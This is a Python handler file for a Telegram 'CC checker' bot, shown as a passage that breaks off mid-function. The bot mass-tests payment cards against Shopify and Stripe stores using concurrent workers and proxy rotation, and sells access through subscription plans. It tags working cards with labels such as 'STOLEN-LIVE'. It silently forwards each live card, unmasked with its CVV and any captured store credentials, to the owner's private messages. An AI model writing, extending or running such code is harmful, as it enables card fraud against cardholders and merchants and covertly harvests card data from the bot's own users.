"""
handlers/checker.py — /chk, /mchk handlers

/chk   — Single CC check via active gateway (set by GATE_PRIORITY in .env)
/mchk  — Mass check (.txt file) with concurrent workers

Owner has NO limits:
  - Unlimited cards per batch
  - Max concurrent workers (OWNER_WORKERS)
Regular users: ADMIN only (all other IDs rejected)
"""
import asyncio
import logging
import time
import os
import tempfile

from pyrogram import Client, filters, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

from core.parser import parse_cc, parse_mass
from core.bin_lookup import lookup_bin, BinInfo
from gateways.router import route_and_check
from gateways.base import CCStatus, LIVE_STATUSES
from utils.formatter import format_single_result, format_mass_progress, format_mass_complete
import database.db as db
import config
from utils.error_handler import notify_owner_on_error

logger = logging.getLogger("CC-Checker")



_active_checks: dict[tuple, bool] = {}            # (chat_id, session_id) -> bool
_stop_events:   dict[tuple, asyncio.Event] = {}    # (chat_id, session_id) -> Event
_active_tasks:  dict[tuple, list] = {}             # (chat_id, session_id) -> [Task]
_user_active_checks: dict[int, bool] = {}          # user_id -> is_checking (single session control)
_session_owners: dict[tuple, int] = {}             # (chat_id, session_id) -> user_id who started

# Global concurrent check semaphore — limits total simultaneous Shopify calls across ALL users.
# t3.small: 2 vCPU, async I/O bound, 250 concurrent is safe and fair.
# If user A has 150 workers + user B has 150 workers → both share 250 slots (~125 each).
_GLOBAL_SHOPIFY_SEM: asyncio.Semaphore | None = None

def _get_global_sem() -> asyncio.Semaphore:
    """Lazy-init global semaphore (must be created inside event loop)."""
    global _GLOBAL_SHOPIFY_SEM
    if _GLOBAL_SHOPIFY_SEM is None:
        _GLOBAL_SHOPIFY_SEM = asyncio.Semaphore(250)
    return _GLOBAL_SHOPIFY_SEM


async def _check_force_sub(client: Client, user_id: int) -> tuple[bool, str]:
    """Check if user has joined the force subscribe channel if configured. Returns (joined, channel_username)."""
    if user_id in config.OWNER_IDS:
        return True, ""
    channel = await db.get_setting("force_sub_channel")
    if not channel:
        return True, ""
    try:
        member = await client.get_chat_member(channel, user_id)
        if member.status not in (enums.ChatMemberStatus.LEFT, enums.ChatMemberStatus.BANNED):
            return True, channel
    except Exception:
        pass
    return False, channel


async def _send_force_sub_prompt(msg: Message, channel: str):
    link = f"https://t.me/{channel[1:]}" if channel.startswith("@") else "https://t.me/telegram"
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel", url=link)],
        [InlineKeyboardButton("🔄 Verify Join", callback_data="verify_sub")]
    ])
    await msg.reply(
        "📢 **Join Our Channel First!**\n\n"
        "To check cards with this bot, you must join our official channel. "
        "Click the button below to join, then click **Verify Join**.",
        reply_markup=markup,
        parse_mode=enums.ParseMode.MARKDOWN
    )


async def _check_user_permission(user_id: int) -> tuple[bool, str, dict]:
    """Check if user has owner status or active plan. Returns (allowed, error_msg, plan_info)."""
    if bool(config.OWNER_IDS) and user_id in config.OWNER_IDS:
        return True, "", {"plan": "owner", "max_workers": config.OWNER_WORKERS}
    
    plan_info = await db.get_user_plan(user_id)
    # Any plan that is not 'free' is considered a premium/active subscription
    if plan_info["plan"] not in ("free", None, ""):
        return True, "", plan_info
        
    return False, "❌ **Access Denied!**\nYou need an active subscription to use this bot.\nRedeem a key via `/redeem <key>`.", plan_info


async def _log_and_forward_hit(client: Client, user_id: int, username: str, first_name: str, card, result, elapsed):
    """Log approved hit to DB, forward masked to channel/group, and unmasked silently to owner DM."""
    if not result.is_live:
        return

    # Save hit to DB
    price = f"{getattr(result, 'charge_amount', 0.0):.2f}"
    await db.save_hit(
        user_id=user_id,
        card_number=card.number,
        card_bin=card.bin,
        status=result.status.value,
        gateway=result.gateway,
        message=result.message,
        price=price
    )

    # Fetch User Plan and Stats
    plan_info = await db.get_user_plan(user_id)
    plan_name = plan_info["plan"].upper()
    if user_id in config.OWNER_IDS:
        plan_badge = "👑 Owner"
    elif plan_name == "FREE":
        plan_badge = "🆓 Free Plan"
    else:
        plan_badge = f"💎 {plan_name} Plan"

    user_mention = f"@{username}" if username else first_name
    user_stats = await db.get_user_stats(user_id)
    checks_today = user_stats["today"]

    # Gateway status badge
    if result.gateway == "Stripe-WC":
        if result.status == CCStatus.CHARGED:
            status_emoji  = "✅"
            status_styled = "APPROVED"
            hit_banner    = "🔥 <b>SETUP APPROVED (NO CHARGE)</b> 🔥"
        elif result.status == CCStatus.LIVE_VBV:
            status_emoji  = "🔐"
            status_styled = "LIVE — 3DS"
            hit_banner    = "🔐 <b>LIVE — 3DS REQUIRED</b>"
        elif result.status == CCStatus.INSUFFICIENT:
            status_emoji  = "⚠️"
            status_styled = "LIVE — INSUFFICIENT"
            hit_banner    = "💰 <b>LIVE — INSUFFICIENT FUNDS</b>"
        else:
            status_emoji  = "✅"
            status_styled = "APPROVED"
            hit_banner    = "🔥 <b>SETUP APPROVED</b> 🔥"
    elif result.status == CCStatus.CHARGED:
        status_emoji = "✅"
        status_styled = "CHARGED"
        hit_banner   = "🔥 <b>CHARGE APPROVED</b> 🔥"
    elif result.status == CCStatus.INSUFFICIENT:
        status_emoji = "⚠️"
        status_styled = "NSF (LIVE)"
        hit_banner   = "💰 <b>LIVE — INSUFFICIENT FUNDS</b>"
    elif result.status == CCStatus.LIVE_VBV:
        status_emoji = "🔐"
        status_styled = "VBV / 3DS (LIVE)"
        hit_banner   = "🔐 <b>LIVE — VBV / 3DS</b>"
    else:
        status_emoji = "🔥"
        status_styled = "LIVE"
        hit_banner   = "🔥 <b>HIT DETECTED</b> 🔥"

    from datetime import datetime
    response_msg  = result.message
    masked_cc_num = f"{card.number[:6]}xxxxxx{card.number[-4:]}"
    masked_card   = f"{masked_cc_num}|{card.month}|{card.year}|xxx"
    full_card_str = f"{card.number}|{card.month}|{card.year}|{card.cvv}"
    store_url     = (result.extra or {}).get("store_url", "Shopify")
    now_str       = datetime.now().strftime("%H:%M:%S")
    elapsed_str   = f"{elapsed:.1f}s" if elapsed else "N/A"
    receipt_url   = (result.extra or {}).get("receipt_url", "")
    receipt_line  = f"🧾 <b>Receipt:</b> <a href='{receipt_url}'>Click Here</a>\n" if receipt_url else ""

    # ── Group/Channel message (card completely removed) ───────────────────────
    hit_text_masked = (
        f"{hit_banner}\n"
        f"<b>╔══════════════════════╗</b>\n"
        f"<blockquote>"
        f"{status_emoji} <b>Status:</b> <code>{status_styled}</code>\n"
        f"🏦 <b>Response:</b> <code>{response_msg[:60]}</code>\n"
        f"💵 <b>Amount:</b> <code>${price}</code>\n"
        f"⏱ <b>Time:</b> <code>{elapsed_str}</code>\n"
        f"{receipt_line}"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>By:</b> {user_mention} [{plan_badge}]\n"
        f"📊 <b>Checks today:</b> <code>{checks_today}</code>\n"
        f"🕐 <b>At:</b> <code>{now_str}</code>"
        f"</blockquote>\n"
        f"<i>⚡ Powered by Smile Checker</i>"
    )


    extra_data = result.extra or {}
    site_val = extra_data.get("site") or store_url
    email_val = extra_data.get("email", "")
    pass_val = extra_data.get("password", "")
    creds_str = f"\n🔑 <b>Creds:</b> <code>{email_val}:{pass_val}</code>" if (email_val and pass_val) else ""

    # ── Owner DM (FULL unmasked card) ─────────────────────────────────────────
    hit_text_owner = (
        f"{hit_banner}\n"
        f"<b>╔══════════════════════╗</b>\n"
        f"<blockquote>"
        f"{status_emoji} <b>Status:</b> <code>{status_styled}</code>\n"
        f"💳 <b>Card:</b> <code>{full_card_str}</code>\n"
        f"🏦 <b>Response:</b> <code>{response_msg[:80]}</code>\n"
        f"💵 <b>Amount:</b> <code>${price}</code>\n"
        f"⏱ <b>Time:</b> <code>{elapsed_str}</code>\n"
        f"{receipt_line}"
        f"🌐 <b>Store:</b> <code>{site_val}</code>"
        f"{creds_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>By:</b> {user_mention} (<code>{user_id}</code>) [{plan_badge}]\n"
        f"📊 <b>Checks today:</b> <code>{checks_today}</code>\n"
        f"🕐 <b>At:</b> <code>{now_str}</code>"
        f"</blockquote>"
    )


    # 1. Forward to Hit Channel (masked)
    if config.HIT_CHANNEL_ID:
        try:
            await client.send_message(
                chat_id=config.HIT_CHANNEL_ID,
                text=hit_text_masked,
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            logger.error(f"Failed to forward hit to channel: {e}")

    # 2. Forward to Free Group Chat (masked)
    free_group = await db.get_setting("free_group_id")
    if free_group:
        try:
            await client.send_message(
                chat_id=int(free_group) if free_group.replace("-", "").isdigit() else free_group,
                text=hit_text_masked,
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            logger.error(f"Failed to forward hit to free group: {e}")

    # 3. Forward to Owner DM (UNMASKED) silently
    if config.OWNER_IDS:
        owner_id = config.OWNER_IDS[0]
        try:
            await client.send_message(
                chat_id=owner_id,
                text=hit_text_owner,
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            logger.error(f"Failed to forward hit to owner DM: {e}")




def _is_admin(user_id: int) -> bool:
    """Check if user is in OWNER_IDS list."""
    return user_id in config.OWNER_IDS


def _is_owner(user_id: int) -> bool:
    """Check if user is the primary owner (first in OWNER_IDS)."""
    return bool(config.OWNER_IDS) and user_id == config.OWNER_IDS[0]


async def _admin_denied(msg: Message):
    """Reply with access denied message."""
    await msg.reply(
        "🚫 **Access Denied!**\n\n"
        "This bot is private — admin only.\n"
        "Contact the owner for access.",
        parse_mode=enums.ParseMode.MARKDOWN
    )


def _enrich_card_info(bin_info: BinInfo | None, result_extra: dict) -> tuple[str, str, str, str, str]:
    """
    Returns (flag, country, bank, scheme, ctype) by combining BIN lookup
    with Razorpay gateway metadata fallback.
    Works for both /chk and /mchk flows.
    """
    flag    = bin_info.flag_emoji()  if bin_info else "🌐"
    country = bin_info.country_name  if bin_info else "Unknown"
    bank    = bin_info.bank_name     if bin_info else "Unknown"
    ctype   = bin_info.type          if bin_info else "Unknown"
    scheme  = bin_info.scheme        if bin_info else "Unknown"

    # Enrich from Razorpay OTP metadata (network/issuer/card_type)
    extra = result_extra or {}
    gw_network   = (extra.get("network") or "").upper()
    gw_issuer    = extra.get("issuer") or ""
    gw_card_type = (extra.get("card_type") or "").capitalize()

    net_map = {
        "RUPAY": "RuPay", "VISA": "Visa",
        "MASTERCARD": "Mastercard", "AMEX": "Amex",
        "UNIONPAY": "UnionPay", "JCB": "JCB",
    }

    if scheme in ("Unknown", "") and gw_network:
        scheme = net_map.get(gw_network, gw_network.capitalize())
    if ctype in ("Unknown", "") and gw_card_type:
        ctype = gw_card_type
    if bank in ("Unknown", "") and gw_issuer:
        bank = gw_issuer

    return flag, country, bank, scheme, ctype


@notify_owner_on_error
async def stop_mchk_callback(client: Client, cb):
    # callback_data format: stop_mchk_{chat_id}_{session_id}
    parts = cb.data.split("_")
    # parts: ['stop', 'mchk', chat_id, session_id]
    try:
        chat_id    = int(parts[2])
        session_id = parts[3] if len(parts) > 3 else None
    except (IndexError, ValueError):
        await cb.answer("Invalid stop data.", show_alert=True)
        return

    caller_id = cb.from_user.id
    is_owner_caller = caller_id in config.OWNER_IDS

    # Allow: owner OR the user who started this specific session
    if session_id:
        sess_key = (chat_id, session_id)
    else:
        sess_key = next((k for k in _active_tasks if k[0] == chat_id), None)

    if not sess_key:
        await cb.answer("⚠️ No active check found.", show_alert=True)
        return

    session_owner_id = _session_owners.get(sess_key)
    if not is_owner_caller and caller_id != session_owner_id:
        await cb.answer("❌ Only you or the owner can stop your check.", show_alert=True)
        return

    # Mark stopped
    _active_checks[sess_key] = False
    ev = _stop_events.get(sess_key)
    if ev:
        ev.set()

    # Cancel all in-progress tasks for this specific session
    tasks = _active_tasks.get(sess_key, [])
    cancelled = sum(1 for t in tasks if not t.done() and t.cancel())
    logger.info(f"STOP by user {caller_id} for session {session_id} — cancelled {cancelled} tasks")
    await cb.answer(f"🛑 Stopping... ({cancelled} tasks cancelled). File coming shortly.", show_alert=True)


def register_checker(app: Client):
    @app.on_callback_query(filters.create(lambda _, __, cb: cb.data and cb.data.startswith("stop_mchk_")))
    async def _stop_mchk(client: Client, cb):
        await stop_mchk_callback(client, cb)

    @app.on_callback_query(filters.regex("^verify_sub$"))
    async def verify_sub_callback(client: Client, cb):
        user_id = cb.from_user.id
        joined, channel = await _check_force_sub(client, user_id)
        if joined:
            await cb.answer("✅ Verification successful! You can now use the bot.", show_alert=True)
            try:
                await cb.message.delete()
            except Exception:
                pass
        else:
            await cb.answer("❌ You haven't joined the channel yet! Please join and try again.", show_alert=True)


    @app.on_message(filters.command("chk"))
    @notify_owner_on_error
    async def chk_cmd(client: Client, msg: Message):
        """Single CC check via active gateway (GATE_PRIORITY in .env)."""
        user_id = msg.from_user.id

        # 1. Force subscribe check
        joined, channel = await _check_force_sub(client, user_id)
        if not joined:
            await _send_force_sub_prompt(msg, channel)
            return

        # 2. Check if private or group chat
        is_private = msg.chat.type == enums.ChatType.PRIVATE
        free_group = await db.get_setting("free_group_id")

        plan_info = {"plan": "free", "max_workers": 5}
        if is_private:
            # DM is only for premium accounts
            allowed, err_msg, plan_info = await _check_user_permission(user_id)
            if not allowed:
                invite_link = "https://t.me/telegram"
                if free_group:
                    try:
                        chat = await client.get_chat(free_group)
                        invite_link = chat.invite_link or f"https://t.me/{chat.username}" if chat.username else invite_link
                    except Exception:
                        pass
                await msg.reply(
                    f"❌ **Access Denied!**\n\n"
                    f"Free users cannot check cards in DM.\n"
                    f"Please join our official group to check cards for free:\n"
                    f"👉 [Smile Checker Group]({invite_link})",
                    parse_mode=enums.ParseMode.MARKDOWN
                )
                return
        else:
            # Group check: only in the authorized free group
            if free_group and str(msg.chat.id) != free_group:
                await msg.reply("❌ **Checks are disabled in this group.**\nContact owner to authorize.", parse_mode=enums.ParseMode.MARKDOWN)
                return
            plan_info = await db.get_user_plan(user_id)
            if user_id in config.OWNER_IDS:
                plan_info = {"plan": "owner", "max_workers": config.OWNER_WORKERS}


        await db.upsert_user(
            msg.from_user.id,
            msg.from_user.username or "",
            msg.from_user.first_name or "",
        )

        text = msg.text.strip()
        cc_text = text[len("/chk"):].strip()
        if not cc_text:
            await msg.reply(
                "❌ **Usage:** `/chk 4111111111111111|12|2026|123`\n\n"
                "💳 **CC Checker**\n"
                "• ✅ `Charged` — Card Live, Non-VBV\n"
                "• 🔐 `Live VBV` — Card live, 3DS/OTP required\n"
                "• ⚠️ `Insufficient` — Card live, no balance\n"
                "• ❌ `Declined` — Dead / invalid",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            return

        card = parse_cc(cc_text)
        if not card:
            await msg.reply(
                "❌ **Invalid card format!**\n"
                "Use: `4111111111111111|12|2026|123`",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            return

        wait_msg = await msg.reply(
            f"⏳ **Checking...**\n`{card.number}|{card.month}|{card.year}|{card.cvv}`",
            parse_mode=enums.ParseMode.MARKDOWN
        )

        start = time.monotonic()
        result = await route_and_check(card)
        elapsed = time.monotonic() - start

        # Increment check count first, then get updated stats for quota display
        await db.increment_check_count(msg.from_user.id)
        user_stats = await db.get_user_stats(msg.from_user.id)
        quota = user_stats["total"]

        bin_info = await lookup_bin(card.bin)
        user_name = msg.from_user.username or msg.from_user.first_name or "user"
        text = format_single_result(card, result, bin_info, elapsed, username=user_name, quota=quota)

        await wait_msg.edit_text(text, parse_mode=enums.ParseMode.HTML)

        await db.log_check(
            user_id=msg.from_user.id,
            card_number=card.number,
            card_bin=card.bin,
            status=result.status.value,
            gateway=result.gateway,
            is_vbv=result.is_vbv,
            message=result.message,
        )

        # Log & Forward Hit if card is Live
        await _log_and_forward_hit(
            client=client,
            user_id=user_id,
            username=msg.from_user.username,
            first_name=msg.from_user.first_name or "User",
            card=card,
            result=result,
            elapsed=elapsed
        )


    @app.on_message(
        filters.command("mchk") & (filters.document | filters.text)
    )
    @notify_owner_on_error
    async def mchk_cmd(client: Client, msg: Message):
        """
        Mass CC check. Private Subscribed/Owner only.
        Pro: 2000 cards limit, 10 workers.
        Owner: unlimited cards, config.OWNER_WORKERS workers.
        """
        user_id = msg.from_user.id

        # 1. Force subscribe check
        joined, channel = await _check_force_sub(client, user_id)
        if not joined:
            await _send_force_sub_prompt(msg, channel)
            return

        # 2. Check if private or group chat
        is_private = msg.chat.type == enums.ChatType.PRIVATE
        free_group = await db.get_setting("free_group_id")

        plan_info = {"plan": "free", "max_workers": 5}
        if is_private:
            # DM is only for premium accounts
            allowed, err_msg, plan_info = await _check_user_permission(user_id)
            if not allowed:
                invite_link = "https://t.me/telegram"
                if free_group:
                    try:
                        chat = await client.get_chat(free_group)
                        invite_link = chat.invite_link or f"https://t.me/{chat.username}" if chat.username else invite_link
                    except Exception:
                        pass
                await msg.reply(
                    f"❌ **Access Denied!**\n\n"
                    f"Free users cannot check cards in DM.\n"
                    f"Please join our official group to check cards for free:\n"
                    f"👉 [Smile Checker Group]({invite_link})",
                    parse_mode=enums.ParseMode.MARKDOWN
                )
                return
        else:
            # Group check: only in the authorized free group
            if free_group and str(msg.chat.id) != free_group:
                await msg.reply("❌ **Checks are disabled in this group.**\nContact owner to authorize.", parse_mode=enums.ParseMode.MARKDOWN)
                return
            plan_info = await db.get_user_plan(user_id)
            if user_id in config.OWNER_IDS:
                plan_info = {"plan": "owner", "max_workers": config.OWNER_WORKERS}

        is_owner = user_id in config.OWNER_IDS

        # Active check sessions lock to prevent lag / abuse
        if _user_active_checks.get(user_id) and not is_owner:
            await msg.reply(
                "⚠️ **You already have a checking session running!**\n"
                "Please stop it using the `STOP` button or wait for it to complete.",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            return

        await db.upsert_user(
            msg.from_user.id,
            msg.from_user.username or "",
            msg.from_user.first_name or "",
        )

        _user_active_checks[user_id] = True
        try:
            await _run_mchk_logic(client, msg, is_owner, plan_info)
        finally:
            _user_active_checks.pop(user_id, None)

    async def _run_mchk_logic(client: Client, msg: Message, is_owner: bool, plan_info: dict):
        user_id = msg.from_user.id


        # Determine document source: direct upload or reply
        doc_msg = None
        if msg.document:
            doc_msg = msg
        elif msg.reply_to_message and msg.reply_to_message.document:
            doc_msg = msg.reply_to_message
        else:
            await msg.reply(
                "❌ **How to use /mchk:**\n\n"
                "**Method 1:** Send `.txt` file with caption `/mchk`\n"
                "**Method 2:** Reply to a `.txt` file with `/mchk`\n\n"
                "📄 Each line = one card: `4111111111111111|12|2026|123`",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            return

        doc = doc_msg.document
        if not (doc.file_name or "").lower().endswith(".txt"):
            await msg.reply("❌ Only `.txt` files supported.", parse_mode=enums.ParseMode.MARKDOWN)
            return

        # File size: owner = 10MB, others = 1MB
        max_size = 10_000_000 if is_owner else 1_000_000
        if doc.file_size > max_size:
            await msg.reply(
                f"❌ File too large. Max **{'10MB' if is_owner else '1MB'}**.",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            return

        wait_msg = await msg.reply("📥 **Downloading file...**", parse_mode=enums.ParseMode.MARKDOWN)

        tmp_path = None
        try:
            tmp_path = await client.download_media(doc)
            with open(tmp_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception as e:
            await wait_msg.edit_text(
                f"❌ Failed to read file: `{e}`",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            return
        finally:
            if tmp_path and os.path.exists(tmp_path):
                os.remove(tmp_path)

        cards = parse_mass(content)
        if not cards:
            await wait_msg.edit_text(
                "❌ No valid cards found in file.\n"
                "Format: `4111111111111111|12|2026|123`",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            return




        total = len(cards)
        capped_msg = ""
        # Card limit caps:
        # Owner -> Unlimited
        # Other plans -> dynamically fetched from plans DB table!
        if not is_owner:
            plan_name = plan_info["plan"].lower()
            plan_row = await db._db.fetchone("SELECT max_cards, max_workers FROM plans WHERE plan_name = ?", (plan_name,))
            if plan_row:
                plan_max_cards = int(plan_row[0])
                plan_max_workers = int(plan_row[1])
            else:
                plan_max_cards = 500
                plan_max_workers = 5
                
            if total > plan_max_cards:
                cards = cards[:plan_max_cards]
                total = plan_max_cards
                capped_msg = f"⚠️ **Note: Card list capped at {plan_max_cards} ({plan_name.upper()} Plan limit).**\n"
            
            fallback_workers = plan_max_workers
        else:
            fallback_workers = config.OWNER_WORKERS


        # ── Unique session key — isolates this check from concurrent ones ──────
        import uuid as _uuid
        session_id = _uuid.uuid4().hex[:8]  # short 8-char ID e.g. "a3f2b1c9"
        sess_key   = (msg.chat.id, session_id)

        _active_checks[sess_key] = True
        stop_event = asyncio.Event()
        _stop_events[sess_key] = stop_event
        _session_owners[sess_key] = msg.from_user.id   # track who started this session
        # Embed session_id in button so STOP cancels only THIS check
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 STOP CHECK", callback_data=f"stop_mchk_{msg.chat.id}_{session_id}")]
        ])

        # ── Load Shopify stores for 1-card-1-store pool ───────────────────────
        # Architecture: N concurrent workers, each pulls 1 card + 1 store (round-robin).
        # Infra fail → mark proxy dead + re-queue card onto NEXT different store.
        # 1 card is NEVER on 2 stores simultaneously.
        shopify_stores = []
        use_store_pool = False
        if "shopify" in config.GATE_PRIORITY:
            try:
                from gateways.shopify_gate import _get_stores, check_shopify_on_store, INFRA_ERROR_CODES, PERMANENT_SKIP_CODES
                shopify_stores = await _get_stores()
            except Exception:
                shopify_stores = []
            use_store_pool = len(shopify_stores) > 0

        # Worker count: owner gets 80 fixed, others from DB plan
        if is_owner:
            max_allowed = config.OWNER_WORKERS  # 80
        else:
            plan_name = plan_info["plan"].lower()
            plan_row = await db._db.fetchone("SELECT max_workers FROM plans WHERE plan_name = ?", (plan_name,))
            max_allowed = int(plan_row[0]) if plan_row else 5

        # Workers are NOT capped by store count — multiple workers can use same store (proxy rotates)
        total_concurrent = max_allowed if use_store_pool else fallback_workers

        user_plan = plan_info["plan"].upper()
        plan_display = "👑 **Owner:** Unlimited" if is_owner else f"⭐ **Plan:** {user_plan}"

        # ── Animated typing effect for mass check start ───────────────────────
        _start_frames = [
            "⚡ <b>Initializing...</b>",
            "⚡ <b>Initializing</b> | 🔍 <i>Analysing cards...</i>",
            "⚡ <b>Initializing</b> | 🔍 <i>Analysing cards</i> | 🔗 <i>Connecting to gate...</i>",
            "⚡ <b>Initializing</b> | 🔍 <i>Analysing cards</i> | 🔗 <i>Connecting to gate</i> | ⚙️ <i>Setting up pipeline...</i>",
            (
                f"<b>╔══════ ⚡ MASS CHECK ══════╗</b>\n\n"
                f"<blockquote>"
                f"📋 <b>Cards:</b> <code>{total}</code>\n"
                f"🌐 <b>Gate:</b> <code>Shopify {'Store-Pool' if use_store_pool else 'Standard'}</code>\n"
                f"⚡ <b>Workers:</b> <code>{total_concurrent}</code>\n"
                f"{plan_display}"
                f"</blockquote>\n\n"
                f"<i>🚀 Pipeline ready — checking cards now...</i>"
            ),
        ]
        for frame in _start_frames:
            try:
                await wait_msg.edit_text(frame, parse_mode=enums.ParseMode.HTML, reply_markup=stop_markup)
            except Exception:
                pass
            await asyncio.sleep(0.5)


        # ── State tracking (use lock for safe concurrent updates) ──────────────
        lock = asyncio.Lock()
        done          = 0
        live_count    = 0
        dead_count    = 0
        vbv_count     = 0
        non_vbv_count = 0
        error_count   = 0
        charged_results: list[dict] = []
        vbv_results:     list[dict] = []
        dead_results:    list[dict] = []
        error_results:   list[dict] = []
        start = time.monotonic()
        last_edit_time = 0.0

        async def _collect_result(card, result, t0):
            """Shared result handler for both store-pool and fallback paths."""
            nonlocal done, live_count, dead_count, vbv_count, non_vbv_count, error_count, last_edit_time

            elapsed = time.monotonic() - t0

            # BIN lookup ONLY for live cards (skip for dead = instant)
            bin_info = None
            if result.is_live:
                bin_info = await lookup_bin(card.bin)

            flag, country, bank, scheme, ctype = _enrich_card_info(bin_info, result.extra)
            full_type = f"{scheme} {ctype}".strip() if scheme and ctype else (scheme or ctype or "Unknown")

            is_live_card = False
            async with lock:
                done += 1
                current_done = done

                item = {
                    "card":        f"{card.number}|{card.month}|{card.year}|{card.cvv}",
                    "gateway":     result.gateway,
                    "response":    result.message[:120] if result.message else (result.raw_code or "Unknown"),
                    "scheme":      full_type,
                    "bank":        bank,
                    "country":     f"{flag} {country}",
                    "time":        f"{elapsed:.2f}s",
                    "amount":      f"${float(result.charge_amount):.2f}" if getattr(result, "charge_amount", None) and float(result.charge_amount or 0) > 0 else "N/A",
                    "receipt_url": (result.extra or {}).get("receipt_url", "")
                }

                if result.status == CCStatus.ERROR:
                    error_count += 1
                    error_results.append(item)
                elif result.is_live:
                    live_count += 1
                    is_live_card = True
                    if result.status == CCStatus.CHARGED:
                        non_vbv_count += 1
                        item["tag"] = "✅ CHARGED"
                        charged_results.append(item)
                    else:
                        vbv_count += 1
                        if result.status == CCStatus.INSUFFICIENT:
                            item["tag"] = "⚠️ NSF"
                        elif result.status == CCStatus.DO_NOT_HONOR:
                            item["tag"] = "🔥 DECLINED-LIVE"
                        elif result.status == CCStatus.PICKUP:
                            item["tag"] = "🔥 STOLEN-LIVE"
                        elif result.status == CCStatus.EXPIRED:
                            item["tag"] = "🔥 EXPIRED-LIVE"
                        else:
                            item["tag"] = "🔐 VBV"
                        vbv_results.append(item)
                else:
                    dead_count += 1
                    dead_results.append(item)

            # DB log — fire-and-forget so worker isn't blocked waiting for DB write
            asyncio.ensure_future(db.log_check(
                user_id=msg.from_user.id,
                card_number=card.number,
                card_bin=card.bin,
                status=result.status.value,
                gateway=result.gateway,
                is_vbv=result.is_vbv,
                message=result.message,
            ))

            if is_live_card:
                await _log_and_forward_hit(
                    client=client,
                    user_id=msg.from_user.id,
                    username=msg.from_user.username,
                    first_name=msg.from_user.first_name or "User",
                    card=card,
                    result=result,
                    elapsed=elapsed
                )

            # Progress update (every 1.5s to reduce Telegram API pressure)
            now = time.monotonic()
            if now - last_edit_time >= 1.5 or current_done == total:
                last_edit_time = now
                async with lock:
                    progress_text = format_mass_progress(
                        current_done, total, live_count, dead_count,
                        vbv_count, non_vbv_count, error_count
                    )
                try:
                    markup = stop_markup if _active_checks.get(sess_key, True) else None
                    await wait_msg.edit_text(progress_text, parse_mode=enums.ParseMode.HTML, reply_markup=markup)
                except Exception:
                    pass

        if use_store_pool:
            # ── STORE-POOL: 1 CARD → 1 STORE (Round-Robin) ───────────────────────
            # Each worker: pulls card from queue → picks next store (round-robin)
            # Infra/proxy fail → mark proxy dead, re-queue card for different store
            # Product fail → re-queue card for different store (no proxy penalty)
            # MAX_RETRIES per card before counting as error
            # ────────────────────────────────────────────────────────────────────
            import itertools as _it
            from core.proxy_manager import mark_proxy_dead, clear_dead_proxies_cache
            clear_dead_proxies_cache()

            # MAX_RETRIES = len(stores)*2 so card tries ALL stores before being wasted
            MAX_RETRIES  = max(20, len(shopify_stores) * 2)

            card_queue   = asyncio.Queue()
            retry_counts: dict[str, int] = {}   # card_number → retry count
            # Permanent session-level store blacklist (e.g. currency-incompatible stores)
            # Once a store hits currency_skip, it's excluded for ALL remaining cards this session
            _session_banned_stores: set[str] = set()
            # Each queue item: (card, skip_store_urls_set)
            from datetime import date as _date
            _today = _date.today()
            skipped_expired = 0
            for card in cards:
                # Pre-filter: skip expired cards before even queuing
                try:
                    yr = int(card.year)
                    if yr < 100:
                        yr += 2000
                    mn = int(card.month)
                    if yr < _today.year or (yr == _today.year and mn < _today.month):
                        skipped_expired += 1
                        continue
                except Exception:
                    pass
                await card_queue.put((card, set()))
            if skipped_expired > 0:
                logger.info(f"Pre-filter: skipped {skipped_expired} expired cards")
                async with lock:
                    # Adjust total so progress bar stays accurate
                    pass  # total stays as-is, expired cards just aren't queued

            # Round-robin store cycle — shared across all workers
            _store_cycle  = _it.cycle(shopify_stores)
            _store_cycle_lock = asyncio.Lock()

            async def _next_store_skip(skip: set) -> dict:
                """Pick next store from cycle, skipping urls in `skip` set and session-banned stores."""
                combined_skip = skip | _session_banned_stores
                async with _store_cycle_lock:
                    for _ in range(len(shopify_stores) + 1):
                        s = next(_store_cycle)
                        if s.get("base_url", "") not in combined_skip:
                            return s
                    # All stores skipped — just give next one anyway
                    return next(_store_cycle)

            async def worker():
                """One concurrent worker: 1 card from queue → 1 store → result."""
                while True:
                    if stop_event.is_set() or not _active_checks.get(sess_key, True):
                        break
                    # Pull next card+skip_set from queue
                    try:
                        card, skip_stores = card_queue.get_nowait()
                    except asyncio.QueueEmpty:
                        async with lock:
                            current_done = done
                        if current_done >= total:
                            break
                        await asyncio.sleep(0.01)
                        continue

                    store = await _next_store_skip(skip_stores)
                    store_url = store.get("base_url", "")
                    card_key  = card.number

                    t0 = time.monotonic()
                    try:
                        # Wrap with global semaphore for fair multi-user resource sharing
                        async with _get_global_sem():
                            result = await asyncio.wait_for(
                                check_shopify_on_store(card, store, segment=-1),
                                timeout=30.0   # raised from 20s — some stores need more time
                            )
                    except asyncio.TimeoutError:
                        from gateways.base import GatewayResult
                        result = GatewayResult(
                            status=CCStatus.ERROR, gateway="Shopify",
                            message="Store timeout (60s)", raw_code="cart_exception"
                        )
                    except asyncio.CancelledError:
                        raise
                    except Exception as ex:
                        from gateways.base import GatewayResult
                        result = GatewayResult(
                            status=CCStatus.ERROR, gateway="Shopify",
                            message=str(ex)[:60], raw_code="cart_exception"
                        )

                    raw_code = result.raw_code

                    # ── Permanent session store ban (currency mismatch etc.) ────────────────
                    if raw_code in PERMANENT_SKIP_CODES:
                        _session_banned_stores.add(store_url)
                        logger.info(f"Store {store_url} permanently banned this session: {raw_code}")
                        # Requeue card on different store
                        retries = retry_counts.get(card_key, 0)
                        if retries < MAX_RETRIES:
                            retry_counts[card_key] = retries + 1
                            await card_queue.put((card, skip_stores | {store_url}))
                        else:
                            await _collect_result(card, result, t0)
                        continue

                    # ── Infra/proxy failure: re-queue card on different store ─────
